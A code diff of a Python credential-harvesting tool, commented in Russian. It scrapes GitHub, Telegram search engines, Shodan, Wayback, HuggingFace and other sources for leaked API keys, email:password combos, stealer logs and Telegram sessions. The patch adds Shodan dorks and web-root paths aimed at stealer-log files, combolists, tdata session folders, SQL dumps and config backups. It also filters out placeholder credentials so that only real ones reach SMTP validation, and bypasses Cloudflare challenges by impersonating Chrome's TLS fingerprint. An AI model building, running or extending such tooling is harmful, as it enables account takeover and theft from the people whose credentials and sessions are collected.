@@ -180,9 +180,10 @@ DEFAULT_CONFIG = {
     "disabled_sources": [],
     "relay_boards": [],
     "vault_repo": "Ins2lt/night-vault",
-    "validate_budget": 1500,
-    "source_timeout": 1200,
-    "shodan_budget": 1080,
+    "validate_budget": 600,  # сек на валидацию (было 1500 — хвост skgen-хлама)
+    "source_timeout": 300,  # сек на источник (было 1200 — цикл вечный)
+    "shodan_budget": 240,  # сек внутри shodan (было 1080 — run_sources убивал
+    # на 300с и выбрасывал результаты; 240 < 300 = успевает сдать чанки)
     "shodan_page_mult": 2,
     "urlscan_key": "",
     "kaggle_token": "",
@@ -293,6 +294,31 @@ def _log_file():
     return _LOG_FH or None
 
 
+def _rotate_log(max_bytes=5_000_000, keep_bytes=1_000_000):
+    """Ротация kh_monitor.log. АУДИТ-фикс 2026-09-13: раньше main() урезал файл
+    через open("wb"), пока _LOG_FH держал его открытым — следующая запись шла
+    по СТАРОМУ offset и растягивала файл NUL-паддингом до прежнего размера.
+    Закрываем handle под локом, урезаем, handle переоткроется лениво."""
+    global _LOG_FH
+    with LOG_LOCK:
+        try:
+            if _LOG_FH:
+                try:
+                    _LOG_FH.close()
+                except Exception:
+                    pass
+                _LOG_FH = None
+            if not os.path.exists(LOG_PATH) or os.path.getsize(LOG_PATH) <= max_bytes:
+                return
+            with open(LOG_PATH, "rb") as f:
+                f.seek(-keep_bytes, os.SEEK_END)
+                tail = f.read()
+            with open(LOG_PATH, "wb") as f:
+                f.write(b"... rotated ...\n" + tail)
+        except Exception:
+            pass
+
+
 def log(msg):
     with LOG_LOCK:
         try:
@@ -315,9 +341,7 @@ def load_config():
         except Exception as e:
             log("config parse err: %s (defaults)" % e)
     if not os.path.exists(CONFIG_PATH):
-        json.dump(
-            cfg, open(CONFIG_PATH, "w", encoding="utf-8"), ensure_ascii=False, indent=2
-        )
+        _atomic_json_dump(CONFIG_PATH, cfg, indent=2)
     return cfg
 
 
@@ -344,8 +368,17 @@ SHODAN_KEYS_FILE = _resolve_shodan_keys_file()
 
 # ------------------------------------------------------------------ HTTP
 def http(
-    method, url, timeout=(8, 20), stream=False, headers=None, json_body=None, data=None
+    method,
+    url,
+    timeout=(8, 20),
+    stream=False,
+    headers=None,
+    json_body=None,
+    data=None,
+    want_headers=False,
 ):
+    # want_headers=True -> вернуть (response, headers_dict): нужно валидаторам,
+    # которые читают rate-limit фингерпринт (anthropic-ratelimit-*).
     host = urlparse(url).hostname or url
     h = dict(UA)
     if headers:
@@ -376,6 +409,8 @@ def http(
             # включая CF-челлендж — хост навсегда залипал на плохом канале)
             if r.status_code < 400 and TRANSPORT.get(host) != name:
                 TRANSPORT[host] = name
+            if want_headers:
+                return r, dict(r.headers or {})
             return r
         except Exception as e:
             last = e
@@ -1181,7 +1216,7 @@ JUNKY_KEY_RE = re.compile(
     # прогонов был мёртв с рождения (sk-xxxxxxxx... проходил на ура).
     # Все группы — незахватывающие, (.) остаётся группой №1.
     r"test[-_]?(?:key|token|api)|fake[-_]|dummy[-_]?(?:key|token)|"
-    r"sample[-_]?(?:key|token)|abcdefgh|aaabbb|qwerty|"
+    r"sample[-_]?(?:key|token)|abcdefgh|aaabbb|qwerty|AAA[-_]?bbb|bbb[-_]?CCC|"
     r"(.)\1{7,}",  # прогон одного символа 8+ раз (AAAAAAA...)
     re.I,
 )
@@ -1586,10 +1621,19 @@ def extract_candidates(text):
     # Сплит-формат Laravel/Django из закоммиченных .env — главный источник.
     for email, pwd in _ENV_SMTP_RE.findall(text or ""):
         pwd = pwd.rstrip("\"';,)")
-        if len(pwd) >= 6 and "@" in email:
-            _k = "%s|%s" % (email, pwd)
-            if _k not in [x for x, _, _ in out]:
-                out.append((_k, "email-cred", None))
+        # АУДИТ-фикс 2026-09-13: те же фильтры, что в extract_email_creds —
+        # без них плейсхолдеры из .env.example (your-email@example.com|password)
+        # доезжали до SMTP-валидации и жгли попытки (лог: unverified your-email@…)
+        if len(pwd) < 6 or "@" not in email:
+            continue
+        _dom = email.rsplit("@", 1)[-1].lower().rstrip(".")
+        if _dom in CRED_BAD_DOMAINS or "your" in email.lower():
+            continue
+        if pwd.lower() in CRED_BAD_PASS or "your" in pwd.lower():
+            continue
+        _k = "%s|%s" % (email, pwd)
+        if _k not in [x for x, _, _ in out]:
+            out.append((_k, "email-cred", None))
     # baseten: 8.32 ключ (aEXAlxkF.x32) — только рядом с baseten-контекстом
     # (без контекста это случайный мусор вида слов.слов)
     # АУДИТ-фикс: re.I — "Baseten"/"BASETEN" в mixed-case раньше не матчились
@@ -1620,6 +1664,111 @@ class Source:
 
     def fetch(self):
         return []
+
+
+# ==================================================================
+# SOURCE FACTORY: динамическое создание источников из конфига
+# ==================================================================
+class SourceFactory:
+    """Фабрика для создания источников из конфига source_factories."""
+
+    @staticmethod
+    def create_source(cfg_entry):
+        """Создаёт источник из конфигурации.
+
+        cfg_entry: {
+            "name": "gitlab-code",
+            "type": "http",  # http | github | gitlab | reddit | telegram
+            "url_template": "https://gitlab.com/api/v4/search?scope=blobs&search={query}",
+            "queries": ["sk-ant", "sk-proj", "sk-or"],
+            "headers": {"Accept": "application/json"},
+            "timeout": [8, 15],
+            "max_items": 20,
+            "text_path": "data",  # путь к тексту в JSON-ответе
+            "enabled": True,
+        }
+        """
+        name = cfg_entry.get("name", "unknown")
+        stype = cfg_entry.get("type", "http")
+        url_template = cfg_entry.get("url_template", "")
+        queries = cfg_entry.get("queries", [])
+        headers = cfg_entry.get("headers", {})
+        timeout = tuple(cfg_entry.get("timeout", [8, 15]))
+        max_items = int(cfg_entry.get("max_items", 20))
+        text_path = cfg_entry.get("text_path", "")
+        enabled = cfg_entry.get("enabled", True)
+
+        if not enabled or not url_template or not queries:
+            return None
+
+        class DynamicSource(Source):
+            def __init__(self):
+                self.name = name
+
+            def fetch(self):
+                out = []
+                for q in queries:
+                    try:
+                        url = url_template.format(query=urlquote(q))
+                        r = http("GET", url, timeout=timeout, headers=headers)
+                        if r.status_code != 200:
+                            continue
+                        j = r.json()
+                        # извлекаем текст по text_path (поддержка вложенных)
+                        items = j
+                        for part in text_path.split("."):
+                            if isinstance(items, dict):
+                                items = items.get(part, [])
+                            elif isinstance(items, list):
+                                items = [
+                                    it.get(part, {}) if isinstance(it, dict) else it
+                                    for it in items
+                                ]
+                        if not isinstance(items, list):
+                            items = [items]
+                        for item in items[:max_items]:
+                            if isinstance(item, dict):
+                                # ищем текст в разных полях
+                                for key in (
+                                    "text",
+                                    "content",
+                                    "body",
+                                    "data",
+                                    "snippet",
+                                    "code",
+                                ):
+                                    if (
+                                        key in item
+                                        and isinstance(item[key], str)
+                                        and len(item[key]) > 10
+                                    ):
+                                        out.append(
+                                            (
+                                                item[key],
+                                                "%s:%s" % (name, item.get("id", "?")),
+                                            )
+                                        )
+                                        break
+                            elif isinstance(item, str) and len(item) > 10:
+                                out.append((item, "%s:raw" % name))
+                    except Exception:
+                        continue
+                return out
+
+        return DynamicSource()
+
+
+def load_dynamic_sources():
+    """Загружает динамические источники из конфига."""
+    sources = []
+    for entry in CFG.get("source_factories", []):
+        try:
+            s = SourceFactory.create_source(entry)
+            if s:
+                sources.append(s)
+        except Exception:
+            continue
+    return sources
 
 
 class Gists(Source):
@@ -1775,12 +1924,13 @@ class GitHubCode(Source):
     name = "github-code"
 
     def fetch(self):
-        if not gh_token():
+        _tok0 = gh_token()  # один слот ротации: проверка и заголовок — один вызов
+        if not _tok0:
             return []
         out = []
         headers = {
             "Accept": "application/vnd.github+json",
-            "Authorization": "Bearer " + gh_token(),
+            "Authorization": "Bearer " + _tok0,
         }
         import time as _t
 
@@ -1829,6 +1979,14 @@ class GitHubCode(Source):
             '"@hotmail.com:" extension:txt',
             '"@outlook.com:" extension:txt',
             "filename:combo extension:txt",
+            # 🎯 TG-СЕССИИ: StringSession/userbot-конфиги (одна строка = аккаунт)
+            '"StringSession"',
+            '"session_string" "api_hash"',
+            "filename:*.session telethon",
+            '"PYROGRAM_SESSION"',
+            '"tdata" "key_datas"',
+            '"api_id" "api_hash" "StringSession"',
+            '"SESSION_STRING" heroku',
             "filename:combolist extension:txt",
             '"mail:pass" extension:txt',
             '"email:pass" extension:txt',
@@ -2278,10 +2436,9 @@ class GitHubCode(Source):
                 if res:
                     out.append(res)
         # 🧠 сохраняем выученное (переживает циклы и деплои)
+        # АУДИТ-фикс: атомарно — крах посреди open("w") обнулял статистику
         try:
-            json.dump(
-                qstats, open(QSTATS_PATH, "w", encoding="utf-8"), ensure_ascii=False
-            )
+            _atomic_json_dump(QSTATS_PATH, qstats)
         except Exception:
             pass
         return out
@@ -2293,12 +2450,13 @@ class GitHubCommits(Source):
     name = "github-commits"
 
     def fetch(self):
-        if not gh_token():
+        _tok = gh_token()  # один слот ротации: проверка и заголовок — один вызов
+        if not _tok:
             return []
         out = []
         headers = {
             "Accept": "application/vnd.github+json",
-            "Authorization": "Bearer " + gh_token(),
+            "Authorization": "Bearer " + _tok,
         }
         # ищем коммиты, где удаляли .env / ключи ("remove key", "remove env")
         for q in (
@@ -2353,12 +2511,13 @@ class GitHubIssues(Source):
     name = "github-issues"
 
     def fetch(self):
-        if not gh_token():
+        _tok = gh_token()  # один слот ротации: проверка и заголовок — один вызов
+        if not _tok:
             return []
         out = []
         headers = {
             "Accept": "application/vnd.github+json",
-            "Authorization": "Bearer " + gh_token(),
+            "Authorization": "Bearer " + _tok,
         }
         # GitHub API требует is:issue / is:pull-request в queries
         for q in (
@@ -2780,18 +2939,27 @@ class TGSearch(Source):
 
     def fetch(self):
         out = []
+        # комбо/аккаунты/TG-сессии — сцена выкладывает это В КАНАЛАХ
         queries = (
-            "sk-ant-api03",
             "MAIL_PASSWORD",
             "claude max account",
             "chatgpt combo",
             "mail pass combo",
+            "tdata session",
+            "telegram session string",
+            "stealer logs",
+            "combolist",
+            "аккаунты раздача",
+            "комбо база",
         )
+        # ротация по 6 за цикл: 10 запросов x 2 движка = флуд-риск
+        _rot = int(time.time() // 600) % len(queries)
+        qbatch = [queries[(_rot + i) % len(queries)] for i in range(6)]
         for engine in (
             "https://lyzem.com/search?q=",
             "https://telegago.com/search?q=",
         ):
-            for q in queries[:3]:
+            for q in qbatch:
                 try:
                     r = http("GET", engine + urlquote(q), timeout=(8, 15))
                     if r is None or r.status_code != 200:
@@ -2909,41 +3077,58 @@ class SearxNG(Source):
     name = "se-searxng"
 
     def fetch(self):
+        # АУДИТ 2026-09-13: раньше ПЕРВЫЙ живой инстанс получал все 8 запросов
+        # и ловил 429 (инстансы капят ~5 запросов/мин на IP) -> источник давал
+        # 0-2 чанка и автоскипался. Теперь: распределяем запросы по ВСЕМ живым
+        # инстансам round-robin, 429 -> следующий инстанс.
         out = []
-        inst = None
+        live = []
         for base in CFG["searx_instances"]:
             try:
                 r = http("GET", base + "/search?q=test&format=json", timeout=(6, 10))
                 if r.status_code == 200:
-                    inst = base
-                    break
+                    live.append(base)
             except Exception:
                 continue
-        if not inst:
+        if not live:
             log("  [se-searxng] нет живых инстансов")
             return out
+        import itertools
+
+        inst_cycle = itertools.cycle(live)
         for q in CFG["se_queries"][:8]:
-            try:
-                r = http(
-                    "GET",
-                    inst + "/search?q=%s&format=json" % urlquote(q),
-                    timeout=(8, 15),
-                )
-                if r.status_code != 200:
+            done = False
+            for _try in range(min(3, len(live))):
+                inst = next(inst_cycle)
+                try:
+                    r = http(
+                        "GET",
+                        inst + "/search?q=%s&format=json" % urlquote(q),
+                        timeout=(8, 15),
+                    )
+                    if r.status_code == 429:
+                        continue  # инстанс капнул — следующий
+                    if r.status_code != 200:
+                        break
+                    for res in (r.json().get("results") or [])[:8]:
+                        content = res.get("content") or ""
+                        if content:
+                            out.append(
+                                (content, "searx:" + str(res.get("url", ""))[:60])
+                            )
+                        u = res.get("url")
+                        if u and not SKIP_URL_RE.search(u):
+                            try:
+                                t, _ = fetch_text(u, (8, 18), 400_000)
+                                if t:
+                                    out.append((t, u))
+                            except Exception:
+                                continue
+                    done = True
+                    break
+                except Exception:
                     continue
-                for res in (r.json().get("results") or [])[:8]:
-                    content = res.get("content") or ""
-                    if content:
-                        out.append((content, "searx:" + str(res.get("url", ""))[:60]))
-                    u = res.get("url")
-                    if u and not SKIP_URL_RE.search(u):
-                        try:
-                            t, _ = fetch_text(u, (8, 18), 400_000)
-                            if t:
-                                out.append((t, u))
-                        except Exception:
-                            continue
-            except Exception:
+            if not done:
                 continue
             time.sleep(1.0)
         return out
@@ -2952,9 +3137,33 @@ class SearxNG(Source):
 class LinuxDo(Source):
     name = "linux.do"
 
+    def _get(self, url, timeout=(10, 20)):
+        """АУДИТ 2026-09-13: cloudscraper НЕ пробивает CF managed-challenge
+        linux.do (JS challenge + TLS-fingerprint check). curl_cffi с
+        impersonate=chrome решает оба слоя — TLS-фингерпринт и cookie-clearance
+        без JS-рантайма. Фолбэк на cloudscraper для обратной совместимости."""
+        try:
+            from curl_cffi import requests as cfrequests
+
+            r = cfrequests.get(
+                url,
+                timeout=timeout[1],
+                impersonate="chrome",
+                proxies={
+                    "http": PROXY.proxies.get("http"),
+                    "https": PROXY.proxies.get("https"),
+                },
+                verify=False,
+            )
+            if r.status_code == 200:
+                return _CurlResp(r)
+        except Exception:
+            pass
+        return cloud_get(url, timeout)
+
     def fetch(self):
         out = []
-        r = cloud_get("https://linux.do/latest.json?no_definitions=true")
+        r = self._get("https://linux.do/latest.json?no_definitions=true")
         if r is None or r.status_code != 200:
             log("  [linux.do] CF fail")
             return out
@@ -2965,7 +3174,7 @@ class LinuxDo(Source):
             return out
         with concurrent.futures.ThreadPoolExecutor(max_workers=6) as ex:
             futs = {
-                ex.submit(cloud_get, "https://linux.do/t/%d.json" % i, (10, 20)): i
+                ex.submit(self._get, "https://linux.do/t/%d.json" % i, (10, 20)): i
                 for i in tids
             }
             for f in concurrent.futures.as_completed(futs):
@@ -2985,6 +3194,18 @@ class LinuxDo(Source):
                 except Exception:
                     continue
         return out
+
+
+class _CurlResp:
+    """Адаптер curl_cffi Response -> requests.Response-интерфейс (.json/.text/.status_code)."""
+
+    def __init__(self, r):
+        self._r = r
+        self.status_code = r.status_code
+        self.text = r.text
+
+    def json(self):
+        return self._r.json()
 
 
 class V2ex(Source):
@@ -3586,6 +3807,24 @@ class Shodan(Source):
         ('http.html:"EAA" "facebook"', 1),
         ('http.html:"xapp-1-"', 1),  # slack app-level
         ('http.html:"NRAA-" OR "NRAK-"', 1),  # New Relic
+        # ============ 📦 АККАУНТЫ/ЛОГИ (LOGHUNTER-таргет 2026-09-13) ============
+        # структура стилер-логов и комбо на открытых вебрутах — их жрёт loghunter
+        ('http.html:"url:login:pass"', 2),  # ULP-хедер комбо-файлов
+        ('http.html:"Passwords.txt"', 2),  # файл стилер-лога на вебруте
+        ('http.html:"key_datas"', 2),  # tdata-маркер Telegram Desktop
+        ('http.html:"D877F783D5D3EF8C"', 1),  # tdata map-файл (authKey)
+        ('http.html:"mail access" "combo"', 1),
+        ('http.html:"combolist"', 2),
+        ('http.html:"email:password" "gmail.com"', 1),  # gmail-комбо
+        ('http.html:"soft: " "login: " "pass: "', 1),  # формат Raccoon-логов
+        ('http.title:"Index of /" "logs"', 2),  # листинги папок с логами
+        ('http.title:"Index of /" "combo"', 1),
+        ('http.title:"Index of /" "tdata"', 2),  # листинги tdata-раздач
+        ('http.html:"SID" "HSID" "SSID"', 1),  # google-куки пачкой (лог-дамп)
+        ('http.html:"Login" "Password" "Cookies"', 2),  # сводные файлы логов
+        ('http.html:"telegram" "session" "tdata"', 1),
+        ('http.html:"REDLINE" "passwords"', 1),  # панели/дампы redline
+        ('http.html:"[Autofill]"', 1),  # маркер автозаполнений в логах
     ]
 
     def _key_pool(self):
@@ -3627,6 +3866,29 @@ class Shodan(Source):
         "/.claude/.credentials.json",
         "/cookies.txt",  # экспортнутые куки (netscape-формат)
         "/access.log",  # лог-дампы с Cookie:-заголовками юзеров
+        # 📦 LOGHUNTER: комбо/логи/сессии на открытых вебрутах (2026-09-13)
+        "/combo.txt",
+        "/combolist.txt",
+        "/combos.txt",
+        "/Passwords.txt",  # файл стилер-лога
+        "/passwords.txt",
+        "/logins.txt",
+        "/accounts.txt",
+        "/emails.txt",
+        "/mailpass.txt",
+        "/ulp.txt",
+        "/cookies/",
+        "/logs/",
+        "/combo/",
+        "/backup.sql",
+        "/dump.sql",
+        "/db.sql",
+        "/database.sql",
+        "/users.sql",  # юзер-таблицы с pass-хэшами/плейнами
+        "/wp-config.php.bak",
+        "/wp-config.php.old",
+        "/wp-config.txt",
+        "/config.php.bak",
         # 🔷 baseten/truss: конфиги truss CLI на вебрутах (8.32 api_key)
         "/.trussrc",
         "/trussrc",
@@ -3751,10 +4013,12 @@ class Shodan(Source):
         """Live-фильтр пула: /api-info, только ключи с кредитами.
         Файл пула врёт (дев-ключи показывают 100, реально 0) — мёртвые
         лейны съедали 5/6 запросов цикла. Теперь ВСЕ запросы идут по живым
-        ключам (edu 194k кредитов = жрём на полную)."""
-        alive = []
-        for k in keys:  # безлимит: проверяем ВЕСЬ пул (было keys[:12] — хвост
-            # пула никогда не валидировался и не использовался)
+        ключам (edu 194k кредитов = жрём на полную).
+        АУДИТ-фикс BUG-B: проверка ПАРАЛЛЕЛЬНАЯ — последовательный обход
+        9 ключей с таймаутами (4,8) съедал до ~108с бюджета источника ещё
+        до старта лейнов."""
+
+        def _chk(k):
             try:
                 r = requests.get(
                     "https://api.shodan.io/api-info",
@@ -3763,12 +4027,29 @@ class Shodan(Source):
                     verify=False,
                 )
                 if r.status_code == 200 and (r.json().get("query_credits") or 0) > 0:
-                    alive.append(k)
+                    return k
             except Exception:
-                continue
+                pass
+            return None
+
+        if len(keys) > 2:
+            with concurrent.futures.ThreadPoolExecutor(
+                max_workers=min(8, len(keys))
+            ) as ex:
+                alive = [k for k in ex.map(_chk, keys) if k]
+        else:
+            alive = [k for k in map(_chk, keys) if k]
         return alive if alive else keys[:1]
 
     def fetch(self):
+        # АУДИТ-фикс BUG-B (2026-09-13): жёсткий внутренний дедлайн под
+        # source_timeout. До фикса: lanes до shodan_budget(240) +
+        # _live_scrape(170) + alive_pool = 420с+ > 300с — run_sources убивал
+        # фьючу по as_completed, fetch не возвращал, ВСЕ чанки источника
+        # терялись (лог: "страниц: 82" -> "[shodan] TIMEOUT >300s",
+        # health: skip_left=5).
+        t0_fetch = time.time()
+        t_deadline = t0_fetch + max(20, int(CFG.get("source_timeout", 300)) - 10)
         keys = self._key_pool()
         if not keys:
             return []
@@ -3865,7 +4146,7 @@ class Shodan(Source):
                 return r
             return None
 
-        def run_queries(q_list, key, shared_out=None):
+        def run_queries(q_list, key, shared_out=None, lane_deadline=None):
             # shared_out: инкрементальный слив результатов в ОБЩИЙ список —
             # раньше лейн, упершийся в таймаут фьючи, ТЕРЯЛ всё собранное
             res = []
@@ -3878,7 +4159,12 @@ class Shodan(Source):
                 else:
                     res.append(item)
 
-            deadline = time.time() + shodan_budget
+            # BUG-B: дедлайн лейна приходит сверху (с резервом под scrape);
+            # локальный shodan_budget — только потолок, не договор с источником
+            deadline = min(
+                time.time() + shodan_budget,
+                lane_deadline or time.time() + shodan_budget,
+            )
             for q, pages in q_list:
                 if time.time() >= deadline:
                     break
@@ -3993,6 +4279,11 @@ class Shodan(Source):
                     continue
             return res
 
+        # BUG-B: лейны обязаны освободить время под live-scrape и ВОЗВРАТ
+        # результата до t_deadline. Резерв = 35% остатка (кап 170с, пол 20с).
+        remaining = t_deadline - time.time()
+        scrape_reserve = max(20.0, min(170.0, remaining * 0.35))
+        lane_deadline = min(time.time() + shodan_budget, t_deadline - scrape_reserve)
         if len(multi_keys) > 1:
             # round-robin распределение запросов по ключам
             buckets = [[] for _ in multi_keys]
@@ -4002,7 +4293,7 @@ class Shodan(Source):
                 max_workers=len(multi_keys)
             ) as ex:
                 futs = {
-                    ex.submit(run_queries, buckets[i], k, out): k
+                    ex.submit(run_queries, buckets[i], k, out, lane_deadline): k
                     for i, k in enumerate(multi_keys)
                 }
                 for fut in concurrent.futures.as_completed(futs):
@@ -4013,7 +4304,7 @@ class Shodan(Source):
                         # (shared sink) — больше ничего не теряем
                         continue
         else:
-            out = run_queries(active, keys[0])
+            out = run_queries(active, keys[0], lane_deadline=lane_deadline)
         log(
             "  [shodan] безлимит: %d запросов × до %d стр (mult x%d), страниц: %d, лейнов: %d"
             % (len(active), 12, page_mult, pages_done["n"], len(multi_keys))
@@ -4026,7 +4317,12 @@ class Shodan(Source):
                 seen_ip.add(h[1])
                 uniq.append(h)
         try:
-            out.extend(self._live_scrape(uniq[:64]))
+            # BUG-B: scrape получает только то время, что РЕАЛЬНО осталось
+            # до дедлайна источника (минус 5с на возврат). Раньше фиксированные
+            # 170с поверх выгоревшего бюджета лейнов убивали весь fetch.
+            scrape_cap = max(0.0, min(170.0, t_deadline - time.time() - 5))
+            if scrape_cap >= 10:
+                out.extend(self._live_scrape(uniq[:64], time_cap=scrape_cap))
         except Exception:
             pass
         return out
@@ -4779,10 +5075,7 @@ class Censys(Source):
         ]
         cursor["i"] = cursor.get("i", 0) + self.PER_CYCLE
         try:
-            json.dump(
-                cursor,
-                open(os.path.join(HERE, "censys_cursor.json"), "w", encoding="utf-8"),
-            )
+            _atomic_json_dump(os.path.join(HERE, "censys_cursor.json"), cursor)
         except Exception:
             pass
 
@@ -4830,12 +5123,7 @@ class Censys(Source):
             time.sleep(1.2)  # free: 1 concurrent
         if endpoints:
             try:
-                json.dump(
-                    endpoints,
-                    open(self.ENDPOINTS_PATH, "w", encoding="utf-8"),
-                    indent=1,
-                    ensure_ascii=False,
-                )
+                _atomic_json_dump(self.ENDPOINTS_PATH, endpoints, indent=1)
             except Exception:
                 pass
         if out or new_eps:
@@ -5055,12 +5343,7 @@ class Netlas(Source):
         self._save_state(st)
         if endpoints:
             try:
-                json.dump(
-                    endpoints,
-                    open(self.ENDPOINTS_PATH, "w", encoding="utf-8"),
-                    indent=1,
-                    ensure_ascii=False,
-                )
+                _atomic_json_dump(self.ENDPOINTS_PATH, endpoints, indent=1)
             except Exception:
                 pass
         if out:
@@ -5385,17 +5668,19 @@ class WaybackHunt(Source):
             pass
         # АУДИТ-фикс: было doms[:15] — новые релеи (файл дополняется
         # append'ом) никогда не попадали в окно. Вращаем по 15 мин.
-        if len(doms) > 15:
+        # АУДИТ 2026-09-12: 15 доменов × 60с CDX + снапшоты > 300с source_timeout
+        # -> TIMEOUT и потеря всего. Режем до 8 доменов и таймаут 25с.
+        if len(doms) > 8:
             _rot = int(time.time() // 900)
-            _st = (_rot * 15) % len(doms)
-            doms = [doms[(_st + i) % len(doms)] for i in range(15)]
+            _st = (_rot * 8) % len(doms)
+            doms = [doms[(_st + i) % len(doms)] for i in range(8)]
         for dom in doms:
             try:
                 r = http(
                     "GET",
-                    "https://web.archive.org/cdx/search/cdx?url=%s/*&output=json&limit=100&filter=statuscode:200&collapse=urlkey"
+                    "https://web.archive.org/cdx/search/cdx?url=%s/*&output=json&limit=60&filter=statuscode:200&collapse=urlkey"
                     % dom,
-                    timeout=(15, 60),
+                    timeout=(10, 25),
                 )
                 if r is None or r.status_code != 200:
                     continue
@@ -5409,10 +5694,14 @@ class WaybackHunt(Source):
                     url = row[2] if len(row) > 2 else ""
                     if any(k in url.lower() for k in self.INTERESTING):
                         # тянем архивную копию (реальный timestamp снапшота)
+                        # АУДИТ 2026-09-12: макс 12 снапшотов на домен — иначе
+                        # 60 URL × 30с = гарантированный TIMEOUT источника
+                        if sum(1 for _, o in out if o.startswith("wayback:")) >= 12 * 8:
+                            break
                         try:
                             t, _ = fetch_text(
                                 "https://web.archive.org/web/%s/%s" % (ts_snap, url),
-                                (10, 30),
+                                (6, 15),
                                 400_000,
                             )
                             if t:
@@ -6002,12 +6291,13 @@ class GitHubEvents(Source):
     )
 
     def fetch(self):
-        if not gh_token():
+        _tok = gh_token()  # один слот ротации: проверка и заголовок — один вызов
+        if not _tok:
             return []
         out = []
         headers = {
             "Accept": "application/vnd.github+json",
-            "Authorization": "Bearer " + gh_token(),
+            "Authorization": "Bearer " + _tok,
         }
         fetched = 0
         for page in (1, 2, 3):
@@ -6446,6 +6736,56 @@ class PublicWWW(Source):
         return out
 
 
+class Marginalia(Source):
+    """search.marginalia.nu — независимый индекс малого веба (HTML, без ключа).
+    Живой, где DDG/Bing отдают challenge: пасты, rentry/telegra.ph, тел.книги."""
+
+    name = "marginalia"
+    QUERIES = (
+        "combolist",
+        "mail access combo",
+        "stealer logs",
+        "StringSession telegram",
+        "tdata telegram",
+        "url:login:pass",
+        "cookies netscape dump",
+    )
+
+    def fetch(self):
+        out = []
+        rot = int(time.time() // 600) % len(self.QUERIES)
+        qbatch = [self.QUERIES[(rot + i) % len(self.QUERIES)] for i in range(3)]
+        for q in qbatch:
+            try:
+                t, code = fetch_text(
+                    "https://search.marginalia.nu/search?query=%s" % urlquote(q),
+                    (10, 25),
+                    600_000,
+                )
+            except Exception:
+                continue
+            if not t or code != 200:
+                continue
+            plain = htmllib.unescape(re.sub(r"<[^>]+>", " ", t))
+            if len(plain) > 200:
+                out.append((plain[:300_000], "marginalia:%s" % q[:24]))
+            targets = []
+            for m in re.finditer(r'href="(https?://[^"]+)"', t):
+                u = m.group(1)
+                if "marginalia" in u or u in targets:
+                    continue
+                targets.append(u)
+            for u in targets[: int(CFG.get("se_max_pages", 3))]:
+                try:
+                    pt, _ = fetch_text(u, (8, 18), 500_000)
+                    if pt:
+                        out.append((pt, u))
+                except Exception:
+                    continue
+            time.sleep(1.5)
+        return out
+
+
 class Lemmy(Source):
     """Lemmy (федиверс) — свежие посты/комменты с ключами, без авторизации."""
 
@@ -6523,12 +6863,7 @@ def _merge_relay_hosts(hosts, src):
                 added += 1
         if added:
             try:
-                json.dump(
-                    rows,
-                    open(path, "w", encoding="utf-8"),
-                    ensure_ascii=False,
-                    indent=1,
-                )
+                _atomic_json_dump(path, rows, indent=1)
                 log("  [%s] +%d relay-доменов в relay_boards.json" % (src, added))
             except Exception:
                 pass
@@ -6633,7 +6968,19 @@ class HFDatasets(Source):
     def fetch(self):
         out = []
         ds_ids = []
-        for term in ("openai", "api key", "claude", "llm proxy", "env"):
+        # аккаунт-вены: в HF лежат целые scraped-датасеты комболистов
+        for term in (
+            "openai",
+            "api key",
+            "claude",
+            "llm proxy",
+            "env",
+            "combolist",
+            "stealer logs",
+            "mail access",
+            "telegram session",
+            "credentials",
+        ):
             try:
                 r = http(
                     "GET",
@@ -6678,7 +7025,19 @@ class HFDatasets(Source):
                         (5, 10),
                         250_000,
                     )
-                    if t and ("sk-" in t or "api_key" in t.lower() or "AIza" in t):
+                    if not t:
+                        continue
+                    low_t = t.lower()
+                    # гейт расширен: датасет с комболистом/сессиями не должен
+                    # отбрасываться только потому, что в нём нет "sk-"
+                    if (
+                        "sk-" in t
+                        or "api_key" in low_t
+                        or "aiza" in low_t
+                        or "password" in low_t
+                        or ("@" in t and ":" in t)
+                        or re.search(r"1B[A-Za-z0-9_-]{300,}", t)
+                    ):
                         got.append((t, "hf-ds:%s/%s" % (ds, fn)))
             except Exception:
                 pass
@@ -7961,10 +8320,7 @@ class SourcegraphSearch(Source):
         if time.time() - float(st.get("ts") or 0) < 1800:
             return out
         try:
-            json.dump(
-                {"ts": time.time()},
-                open(self.STATE_PATH, "w", encoding="utf-8"),
-            )
+            _atomic_json_dump(self.STATE_PATH, {"ts": time.time()})
         except Exception:
             pass
         for q in self.QUERIES:
@@ -8189,12 +8545,7 @@ class InternetDB(Source):
                 note(ip, j)
         if new_eps[0]:
             try:
-                json.dump(
-                    endpoints,
-                    open(self.EP_PATH, "w", encoding="utf-8"),
-                    indent=1,
-                    ensure_ascii=False,
-                )
+                _atomic_json_dump(self.EP_PATH, endpoints, indent=1)
                 log("  [internetdb] +%d новых эндпоинтов для cc-sweep" % new_eps[0])
             except Exception:
                 pass
@@ -9003,6 +9354,7 @@ ALL_SOURCE_CLASSES = [
     StackOverflow,
     SearchDDG,
     SearxNG,
+    Marginalia,
     LinuxDo,
     V2ex,
     HNAlgolia,
@@ -9057,7 +9409,16 @@ ALL_SOURCE_CLASSES = [
     RelayBoards,
     # 📮 Postman public network: публичные коллекции/энвы с прод-ключами
     PostmanHunt,
+    # 🆕 РАСШИРЕНИЕ ПУЛА: новые источники через фабрику
+    # (динамически генерируются из конфига source_factories)
 ]
+
+
+def _build_all_sources():
+    """Собирает все источники: статические классы + динамические из конфига."""
+    sources = [cls() for cls in ALL_SOURCE_CLASSES]
+    sources.extend(load_dynamic_sources())
+    return sources
 
 
 # ------------------------------------------------------------------ DEDUP
@@ -9087,16 +9448,20 @@ def save_seen(seen):
     with open(tmp, "w", encoding="utf-8") as f:
         json.dump(sorted(seen), f)
     os.replace(tmp, SEEN_PATH)
+    # АУДИТ Фаза 3: страж роста. 125K=2.5МБ/0.13с сейв — терпимо; за полмиллиона
+    # записей пора включать TTL. Лог — единственный канал, где это заметят.
+    if len(seen) > 500_000:
+        log("⚠️ seen.json раздулся: %d записей — пора TTL (Фаза 3)" % len(seen))
 
 
-def _atomic_json_dump(path, obj):
+def _atomic_json_dump(path, obj, indent=None):
     """АУДИТ-фикс: tmp+replace для ВСЕХ state-файлов — голый open("w") при
     крэше/отключении питания оставлял обрезанный JSON, и следующий запуск
     молча стартовал с пустого состояния (attempts/stats/evolved терялись)."""
     try:
         tmp = path + ".tmp"
         with open(tmp, "w", encoding="utf-8") as f:
-            json.dump(obj, f, ensure_ascii=False)
+            json.dump(obj, f, ensure_ascii=False, indent=indent)
         os.replace(tmp, path)
     except Exception:
         pass
@@ -9235,6 +9600,19 @@ def vault_push_finds():
 
 def khash(key, base):
     return hashlib.sha1((key + "|" + (base or "?")).encode()).hexdigest()[:16]
+
+
